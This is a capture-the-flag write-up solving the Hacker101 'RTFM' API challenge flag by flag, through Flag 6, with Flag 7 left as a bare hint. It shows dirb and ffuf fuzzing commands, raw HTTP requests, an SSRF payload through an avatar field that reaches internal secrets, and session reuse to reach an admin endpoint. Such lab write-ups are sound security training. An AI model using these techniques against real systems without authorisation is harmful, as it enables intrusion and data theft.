# RTFM Hacker101 CTF

Upon initial inspection, we see that the index returns "API base located at /api/v1/"

Before running off and looking for hints, let's try running a directory scan and see what we can find.

I started with a simple dirb command

```sh
dirb https://<target>/api/v1/
```

which returned the following directories for the target API.

/api/v1/secrets
/api/v1/config
/api/v1/user
/api/v1/status

Let's take a look at what each of these returns for a GET request and get an idea of what we are dealing with.

---

#### FLAG 0

by visiting /api/v1/config
we have our first flag

```json
{
  "server": "Neptune",
  "version": "1.3.94",
  "private_key": "^FLAG^$FLAG$"
}
```

---

#### FLAG 1

I went to the hints to get a running start and was not disappointed.

-- <b>hint</b> --
<i>If a GET doesn’t do anything, try a different HTTP verb. </i>

/api/v1/user on a GET request returns

```json
{ "error": "X-Token header authentication missing" }
```

and POST returns

```json
{
  "error": "Missing username and password field"
}
```

So there must be a form or user endpoint that will add a new user or log a user in. Let's try just adding a username and password

```http
POST /api/v1/user HTTP/2
Host: <target>
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 31

username=test&password=test
```

we still get the error...

lets add a Content-Type header

```http
POST /api/v1/user HTTP/2
Host: <target>
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 31
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

SUCCESS. We have now added a new user and retrieved the second flag

```json
{
  "username": "astro",
  "flag": "^FLAG^$FLAG$",
  "message": "User created go to /api/v1/user/login to login"
}
```

we also, now have a login path; so, let's login

---

#### Flag 2

After logging in and playing around with the user API, I found quite a few interesting points; but no flag.

-- <b>hint</b> --
<i>Maybe you can edit your profile? but what fields can you change?</i>

Let's try some POST and PUT requests
Throughout my career as a developer and hacker I've seen both approaches utilized for updating accounts, profiles etc...

my first thought was that there was a /user/profile or something of the sorts, but after some fuzzing I came back to the /user endpoint itself with a put request.

```http
PUT /api/v1/user HTTP/2
Host: <target>
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Token: 22cbe1bfc55d7955a3f47d250ca36c19
```

RESPONSE

```http
HTTP/2 400 Bad Request
Date: Fri, 10 Jan 2025 03:00:09 GMT
Content-Type: application/json
Server: openresty/1.27.1.1
Server-Name: Neptune

{"error":"No updatable fields supplied"}
```

I decided to fuzz some fields in burp for this one and found that "avatar" returns..

```json
{ "error": "Avatar resource should start with http:// or https:// " }
```

here I got excited, let's try some SSRF

first let's try something simple

```http
PUT /api/v1/user HTTP/2
Host: <target>
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Token: 22cbe1bfc55d7955a3f47d250ca36c19

avatar=http://localhost
```

This looks interesting, we are seeing the exact response from when we started

```json
{ "error": "Non Image detected", "example_data": "API base located at /api/v1/" }
```

Logically, we may be able to move within the API

```http
PUT /api/v1/user HTTP/2
Host: <target>
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Token: 22cbe1bfc55d7955a3f47d250ca36c19

avatar=http://localhost/api/v1/secrets
```

which responds with the following and our flag

```json
{ "error": "Non Image detected", "example_data": "{\"private_key\":\"^FLAG^$FLAG$\"}" }
```

---

#### Flag 3

This flag caught me out a bit.
--<b>hint</b>--
<i>Sometimes developers hide extra features into a page… but how can you access it?</i>

I fuzzed and dug around in the user, secrets and config endpoints and then realised that I hadn't odoe much with status...

I always find it important to fuzz both endpoints and parameters

```sh
ffuf -u <target>/api/v1/user/FUZZ -w /path/to/wordlist.txt -H "X-Token: session-token";
ffuf -u <target>/api/v1/user?FUZZ -w /path/to/wordlist.txt -H "X-Token: session-token";
```

I found that the parameter "verbose" returns a size of 99.

```sh
curl https://38f19933258476b2367ff1b829ed25e3.ctf.hacker101.com/api/v1/status?verbose -H "X-Token: 49cc3115b6042e75208413181f15e200"
```

returned

```json
{ "live": true, "data": "^FLAG^$FLAG$" }
```

and there is our flag 😊

---

#### Flag 4

-- <b>hint</b> --
<i>Have you read the new version of the API's documentation</i>

For this one I used my version fuzzer which can be found [here](www.github.com/astroaspie/api-version-checker").

which returned the following json at <b><i>&lt;target&gt;/api/v2/swagger.json</i></b>

```json
{
  "swagger": "2.0",
  "flag": "^FLAG^$FLAG$",
  "info": {
    "description": "Simple User API",
    "version": "1.0.0",
    "title": "User API",
    "contact": { "email": "noreply@hackerone.com" },
    "license": { "name": "Apache 2.0", "url": "http://www.apache.org/licenses/LICENSE-2.0.html" }
  },
  "tags": [
    { "name": "admins", "description": "Secured Admin-only calls" },
    { "name": "users", "description": "Users of the API" }
  ],
  "schemes": ["https"],
  "paths": {
    "/api/v2/user": {
      "get": {
        "tags": ["users"],
        "summary": "View user details",
        "produces": ["application/json"],
        "parameters": [
          {
            "name": "X-Session",
            "in": "header",
            "required": true,
            "type": "string",
            "format": "d41d8cd98f00b204e9800998ecf8427e"
          }
        ],
        "responses": {
          "200": {
            "description": "Show user information with correct session token",
            "schema": { "type": "array", "items": { "$ref": "#/definitions/User" } }
          },
          "400": { "description": "Missing Session Token" },
          "401": { "description": "Invalid Session Token" }
        }
      },
      "post": {
        "tags": ["users"],
        "summary": "Create User Account",
        "produces": ["application/json"],
        "parameters": [
          { "name": "username", "in": "query", "required": true, "type": "string" },
          { "name": "password", "in": "query", "required": true, "type": "string" }
        ],
        "responses": {
          "201": {
            "description": "User created",
            "schema": { "type": "array", "items": { "$ref": "#/definitions/NewUser" } }
          },
          "400": { "description": "Missing Fields" },
          "409": { "description": "User already exists" }
        }
      }
    },
    "/api/v2/user/login": {
      "post": {
        "tags": ["users"],
        "summary": "Login To User Account",
        "produces": ["application/json"],
        "parameters": [
          { "name": "username", "in": "query", "required": true, "type": "string" },
          { "name": "password", "in": "query", "required": true, "type": "string" }
        ],
        "responses": {
          "201": {
            "description": "User created",
            "schema": { "type": "array", "items": { "$ref": "#/definitions/Login" } }
          },
          "400": { "description": "Missing Fields" },
          "401": { "description": "Invalid Username / Password combination" }
        }
      }
    },
    "/api/v2/admin/user-list": {
      "get": {
        "tags": ["admins"],
        "summary": "View user details",
        "produces": ["application/json"],
        "parameters": [
          {
            "name": "X-Session",
            "in": "header",
            "required": true,
            "type": "string",
            "format": "d41d8cd98f00b204e9800998ecf8427e"
          }
        ],
        "responses": {
          "200": {
            "description": "List all users on the system",
            "schema": { "type": "array", "items": { "$ref": "#/definitions/User" } }
          },
          "400": { "description": "Missing Session Token" },
          "401": { "description": "Invalid Session Token" }
        }
      }
    },
    "/api/v2/user/posts/{id}": {
      "get": {
        "tags": ["users"],
        "summary": "View user details",
        "produces": ["application/json"],
        "parameters": [
          { "name": "id", "in": "path", "required": true, "type": "number", "format": "int" },
          {
            "name": "X-Session",
            "in": "header",
            "required": true,
            "type": "string",
            "format": "d41d8cd98f00b204e9800998ecf8427e"
          }
        ],
        "responses": {
          "200": {
            "description": "Displays Post information",
            "schema": { "type": "array", "items": { "$ref": "#/definitions/Post" } }
          },
          "403": { "description": "This post does not belong to you" },
          "404": { "description": "Post does not exist" }
        }
      }
    }
  },
  "definitions": {
    "User": {
      "type": "object",
      "properties": { "username": { "type": "string", "example": "xxxxxxx" } }
    },
    "Login": {
      "type": "object",
      "properties": {
        "session": { "type": "string", "example": "d41d8cd98f00b204e9800998ecf8427e" }
      }
    },
    "NewUser": {
      "type": "object",
      "properties": {
        "username": { "type": "string", "example": "xxxxxxx" },
        "message": { "type": "string", "example": "User created go to /api/v2/user/login to login" }
      }
    },
    "Post": {
      "type": "object",
      "properties": {
        "username": { "type": "string", "example": "xxxxxxx" },
        "message": { "type": "string", "example": "User created go to /api/v2/user/login to login" }
      }
    }
  }
}
```

and with that, the flag is found; along with quite the juicy data-load

---

#### Flag 5

Within the response from the last flag we can see a 'user-list', let's see if there is a way to get to this list

```json
{
  "error": "X-Session header authentication missing"
}
```

hmmm, well that didn't work.
Let's check the hints

-- <b>hint</b> --
<i>How can you use the same session across multiple different instances and versions?</i>

Ok... that sounds pretty straight forward. Let's use the session key from earlier and see if a request works with that.

You can use curl if you want to be fancy

```sh
curl <target>/api/v2/admin/user-list -H "X-Sesssion: session-key"
```

```json
{
  "users": [{ "username": "^FLAG^$FLAG$" }, { "username": "test" }]
}
```

and there is our next flag. This flag was quite easy but pretty fun.

---

#### Flag 6

-- <b>hint</b> --
<i>Some features were never quite finished properly in some versions</i>

With this information we can infer that there is a feature or endpoint we may be able to leverage with some fuzzing.

Let's fuzz each of the previous urls we were given for flag 0

```sh
ffuf -u <target>/api/v1/user/FUZZ -w wordlist.txt -H "X-Token: session-token"
ffuf -u <target>/api/v1/config/FUZZ -w wordlist.txt -H "X-Token: session-token"
```

GET
/api/v1/user/posts/1

```json
{
  "id": 1,
  "post": "You got the Post: ^FLAG^$FLAG$",
  "analytics": "/api/v1/post-analytics/3c8a6664b8203c2e0b2b24972ccf5ce3"
}
```

---

#### Flag 7

-- <b>hint</b> --
<i>Take a close look at the returned headers from all of your endpoints, is there anything different about one of them? Maybe theres a second server somewhere? Possibly we can get access to things higher up...</i>

---
